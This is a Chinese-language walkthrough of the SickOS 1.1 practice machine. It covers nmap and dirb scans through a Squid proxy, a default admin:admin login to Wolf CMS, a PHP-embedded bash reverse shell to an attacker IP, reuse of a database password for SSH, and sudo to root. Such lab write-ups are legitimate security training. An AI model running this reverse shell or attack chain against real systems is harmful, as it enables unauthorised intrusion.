### 主机发现和nmap扫描

```bash
nmap -sn 192.68.56.0/24
```

靶机ip：192.168.56.105

```bash
nmap -sT --min-rate 10000 192.168.56.105
```

```
PORT     STATE  SERVICE
22/tcp   open   ssh
3128/tcp open   squid-http
8080/tcp closed http-proxy
```

```bash
nmap -sT -sV -sC -O -p22,3128,8080 192.168.56.105
```

```
PORT     STATE  SERVICE    VERSION
22/tcp   open   ssh        OpenSSH 5.9p1 Debian 5ubuntu1.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 09:3d:29:a0:da:48:14:c1:65:14:1e:6a:6c:37:04:09 (DSA)
|   2048 84:63:e9:a8:8e:99:33:48:db:f6:d5:81:ab:f2:08:ec (RSA)
|_  256 51:f6:eb:09:f6:b3:e6:91:ae:36:37:0c:c8:ee:34:27 (ECDSA)
3128/tcp open   http-proxy Squid http proxy 3.1.19
|_http-server-header: squid/3.1.19
|_http-title: ERROR: The requested URL could not be retrieved
8080/tcp closed http-proxy
```

### web渗透

因为80端口没开，8080也是关闭状态，访问3128端口

![image-20240605200003585](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240605200003585.png)

就告诉我们url是无效的，得到关键词`squid/3.1.19`

![image-20240605200322441](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240605200322441.png)

squid是一个代理工具，尝试让3128做代理访问80端口

> # BLEHHH!!!

发现成功访问

#### 目录扫描

```bash
dirb http://192.168.56.105 -p http://192.168.56.105:3128
```

```
---- Scanning URL: http://192.168.56.105/ ----
+ http://192.168.56.105/.bash_history (CODE:200|SIZE:1442)
+ http://192.168.56.105/cgi-bin/ (CODE:403|SIZE:290)
+ http://192.168.56.105/connect (CODE:200|SIZE:325)
+ http://192.168.56.105/index (CODE:200|SIZE:21)
+ http://192.168.56.105/index.php (CODE:200|SIZE:21)
+ http://192.168.56.105/robots (CODE:200|SIZE:45)
+ http://192.168.56.105/robots.txt (CODE:200|SIZE:45)
+ http://192.168.56.105/server-status (CODE:403|SIZE:295)
```

robots.txt下发现

> User-agent: *
> Disallow: /
> Dissalow: /wolfcms

发现是wolfcms

#### wolfcms

![image-20240605201119181](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240605201119181.png)

寻找管理员登录页面，直接百度就行

这个cms漏洞很多，看了一下找到后台登录页面

```
http://192.168.56.105/wolfcms/?/admin/login
```

弱密码`admin:admin`成功登录

发现page里可以直接写php代码，files功能里也可以上传文件

### 系统立足点

反弹shell，得到系统立足点

```php
system("/bin/bash -c 'bash -i >& /dev/tcp/192.168.56.101/1234 0>&1'");
```

得到`www-data`

查看目录，发现config.php

```
// Database settings:
define('DB_DSN', 'mysql:dbname=wolf;host=localhost;port=3306');
define('DB_USER', 'root');
define('DB_PASS', 'john@123');
define('TABLE_PREFIX', '');
```

得到一组凭据`root:john@123`

我们nmap扫描并没有扫到3306端口，猜测应该不能进入数据库

我们还剩一个22端口没有利用，猜测可能是ssh的密码

查看passwd文件，寻找可登录用户

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
syslog:x:101:103::/home/syslog:/bin/false
messagebus:x:102:105::/var/run/dbus:/bin/false
whoopsie:x:103:106::/nonexistent:/bin/false
landscape:x:104:109::/var/lib/landscape:/bin/false
sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
sickos:x:1000:1000:sickos,,,:/home/sickos:/bin/bash
mysql:x:106:114:MySQL Server,,,:/nonexistent:/bin/false
```

第一个可疑的用户就是`sickos`，因为靶机名字就是sickos，尝试ssh登录

拿到sickos用户

```bash
ssh sickos@192.168.56.105
```

### 提权

```bash
sickos@SickOs:~$ sudo -l
[sudo] password for sickos: 
Matching Defaults entries for sickos on this host:
    env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User sickos may run the following commands on this host:
    (ALL : ALL) ALL
```

相当于拿下root了

```bash
sickos@SickOs:~$ sudo /bin/bash
root@SickOs:~# id
uid=0(root) gid=0(root) groups=0(root)
root@SickOs:~# whoami
root
root@SickOs:~# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN 
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN qlen 1000
    link/ether 00:0c:29:3c:d2:44 brd ff:ff:ff:ff:ff:ff
    inet 192.168.56.105/24 brd 192.168.56.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::20c:29ff:fe3c:d244/64 scope link 
       valid_lft forever preferred_lft forever
```

查看flag

```bash
root@SickOs:/root# cat a0216ea4d51874464078c618298b1367.txt 
If you are viewing this!!

ROOT!

You have Succesfully completed SickOS1.1.
Thanks for Trying
```

